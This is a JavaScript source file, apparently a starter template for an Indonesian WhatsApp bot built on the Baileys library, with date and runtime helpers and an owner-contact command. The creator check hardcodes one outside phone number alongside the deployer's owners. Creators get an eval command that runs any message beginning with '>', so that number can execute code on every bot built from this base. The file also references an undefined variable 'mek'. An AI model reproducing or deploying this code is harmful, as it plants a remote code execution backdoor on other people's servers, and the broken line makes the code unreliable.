// BASE MENTAHAN CASE BY JER OFC

require('./settings')
const {
	BufferJSON,
	WA_DEFAULT_EPHEMERAL,
	generateWAMessageFromContent,
	proto,
	generateWAMessageContent,
	generateWAMessage,
	prepareWAMessageMedia,
	areJidsSameUser,
	getContentType
} = require('@adiwajshing/baileys')
const fs = require('fs');
const os = require('os')
const util = require('util');
const chalk = require('chalk');
const axios = require('axios');
const moment = require('moment-timezone');
const ms = toMs = require('ms');
const FormData = require("form-data");
const {
	fromBuffer
} = require('file-type')
const {
	fetchBuffer
} = require("./lib/myfunc2")
const fetch = require('node-fetch')
const {
	exec,
	spawn,
	execSync
} = require("child_process")
const fsx = require('fs-extra')

const {
	smsg,
	fetchJson,
	getBuffer
} = require('./lib/simple')

async function getGroupAdmins(participants) {
	let admins = []
	for (let i of participants) {
		i.admin === "superadmin" ? admins.push(i.id) : i.admin === "admin" ? admins.push(i.id) : ''
	}
	return admins || []
}

function msToDate(mse) {
	temp = mse
	days = Math.floor(mse / (24 * 60 * 60 * 1000));
	daysms = mse % (24 * 60 * 60 * 1000);
	hours = Math.floor((daysms) / (60 * 60 * 1000));
	hoursms = mse % (60 * 60 * 1000);
	minutes = Math.floor((hoursms) / (60 * 1000));
	minutesms = mse % (60 * 1000);
	sec = Math.floor((minutesms) / (1000));
	return days + " Days " + hours + " Hours " + minutes + " Minutes";
}

const isUrl = (url) => {
	return url.match(new RegExp(/https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%_+.~#?&/=]*)/, 'gi'))
}

const sleep = async (ms) => {
	return new Promise(resolve => setTimeout(resolve, ms));
}

const getRandom = (ext) => {
	return `${Math.floor(Math.random() * 10000)}${ext}`
}

const runtime = function (seconds) {
	seconds = Number(seconds);
	var d = Math.floor(seconds / (3600 * 24));
	var h = Math.floor(seconds % (3600 * 24) / 3600);
	var m = Math.floor(seconds % 3600 / 60);
	var s = Math.floor(seconds % 60);
	var dDisplay = d > 0 ? d + (d == 1 ? " day, " : " days, ") : "";
	var hDisplay = h > 0 ? h + (h == 1 ? " hour, " : " hours, ") : "";
	var mDisplay = m > 0 ? m + (m == 1 ? " minute, " : " minutes, ") : "";
	var sDisplay = s > 0 ? s + (s == 1 ? " second" : " seconds") : "";
	return dDisplay + hDisplay + mDisplay + sDisplay;
}

const jsonformat = (string) => {
	return JSON.stringify(string, null, 2)
}

const tanggal = (numer) => {
	myMonths = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"];
	myDays = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jum’at', 'Sabtu'];
	var tgl = new Date(numer);
	var day = tgl.getDate()
	bulan = tgl.getMonth()
	var thisDay = tgl.getDay(),
		thisDay = myDays[thisDay];
	var yy = tgl.getYear()
	var year = (yy < 1000) ? yy + 1900 : yy;
	const time = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
	let d = new Date
	let locale = 'id'
	let gmt = new Date(0).getTime() - new Date('1 January 1970').getTime()
	let weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]

	return `${thisDay}, ${day} - ${myMonths[bulan]} - ${year}`
}

module.exports = jerofc = async (jerofc, m, chatUpdate, store, opengc, antilink, antiwame, antilink2, antiwame2, set_welcome_db, set_left_db, set_proses, set_done, set_open, set_close, sewa, _welcome, _left, db_respon_list, ) => {
	try {
		var body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '' //omzee
		var budy = (typeof m.text == 'string' ? m.text : '')
		const isCmd = /^[_=|~!?#/$%^&.+-,\\\^]/.test(body)
		const prefix = isCmd ? budy[0] : ''
		const command = isCmd ? body.slice(1).trim().split(' ').shift().toLowerCase() : ''
		const args = body.trim().split(/ +/).slice(1)
		const pushname = m.pushName || "No Name"
		const botNumber = await jerofc.decodeJid(jerofc.user.id)
		const isCreator = ["6283136394680@s.whatsapp.net", botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		const text = q = args.join(" ")
		const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
		const quoted = m.quoted ? m.quoted : m
		const mime = (quoted.msg || quoted).mimetype || ''
		const isMedia = /image|video|sticker|audio/.test(mime)
		const groupMetadata = m.isGroup ? await jerofc.groupMetadata(m.chat).catch(e => {}) : ''
		const groupName = m.isGroup ? groupMetadata.subject : ''
		const participants = m.isGroup ? await groupMetadata.participants : ''
		const from = mek.key.remoteJid
		const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
		const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
		const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
		const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
		const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')

		const reply = async (text) => {
			return await jerofc.sendFakeLink(m.chat, text, salam, pushname, m)
		}
		
		if (m.message && !m.key.fromMe) {
			console.log(chalk.black(chalk.bgWhite('[ MSG ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> From'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> In'), chalk.green(m.isGroup ? pushname : 'Chat Pribadi', m.chat))
		}

		function parseMention(text = '') {
			return [...text.matchAll(/@([0-9]{5,16}|0)/g)].map(v => v[1] + '@s.whatsapp.net')
		}

		async function getGcName(groupID) {
			try {
				let data_name = await jerofc.groupMetadata(groupID)
				return data_name.subject
			} catch (err) {
				return '-'
			}
		}

		function pickRandom(list) {
			return list[Math.floor(Math.random() * list.length)]
		}

		switch (command) {
			case 'owner':
			case 'creator': {
				jerofc.sendContact(m.chat, global.owner, m)
			}
			break
			
			default:
				if (budy.startsWith('>')) {
					if (!isCreator) return
					try {
						let evaled = await eval(budy.slice(2))
						if (typeof evaled !== 'string') evaled = require('util').inspect(evaled)
						await reply(evaled)
					} catch (err) {
						await reply(util.format(err))
					}
				}
		}

	} catch (err) {
		m.reply(util.format(err))
	}
}